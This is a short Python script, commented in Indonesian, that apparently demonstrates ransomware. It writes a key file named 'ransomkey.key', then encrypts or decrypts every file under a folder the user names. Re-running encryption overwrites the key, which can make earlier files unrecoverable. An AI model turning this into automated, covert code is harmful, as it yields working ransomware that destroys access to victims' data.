import os 

from cryptography.fernet import Fernet 

# Generate key 

def generate_key(): 

    key = Fernet.generate_key() 

    with open("ransomkey.key", "wb") as key_file: 

        key_file.write(key) 

# Load key 

def load_key(): 

    return open("ransomkey.key", "rb").read() 


# Encrypt file pake key 

def encrypt_file(file_name, key): 

    with open(file_name, "rb") as file: 

        data = file.read() 

    fernet = Fernet(key) 

    encrypted = fernet.encrypt(data) 

    with open(file_name, "wb") as file: 

        file.write(encrypted) 

 

# Decrypt file pake key 

def decrypt_file(file_name, key): 

    with open(file_name, "rb") as file: 

        encrypted_data = file.read() 

    fernet = Fernet(key) 

    decrypted = fernet.decrypt(encrypted_data) 

    with open(file_name, "wb") as file: 

        file.write(decrypted) 

 

# Encrypt semua file di direktori 

def encrypt_direktori(directory, key): 

    for root, dirs, files in os.walk(directory): 

        for file in files: 

            file_path = os.path.join(root, file) 

            encrypt_file(file_path, key) 

 

# Decrypt semua file di direktori 

def decrypt_direktori(directory, key): 

    for root, dirs, files in os.walk(directory): 

        for file in files: 

            file_path = os.path.join(root, file) 

            decrypt_file(file_path, key) 

 

if __name__ == "__main__": 

    pilih = input("1. Enkripsi\n2. Dekripsi\nPilih perintah: ").strip() 

 

    if pilih == '1': 

        generate_key()  # Create a new key for encryption 

        key = load_key() 

        directory = input("Pilih nama folder yang akan dienkripsi: ").strip() 

        encrypt_direktori(directory, key) 

        print(f"Isi folder {directory} telah dienkripsi.") 

    elif pilih == '2': 

        key = load_key()  # Load the previously generated key 

        directory = input("Masukan nama folder yang akan didekripsi: ").strip() 

        decrypt_direktori(directory, key) 

        print(f"Isi folder {directory} telah didekripsi.") 

    else: 

        print("Yang bener kocak")
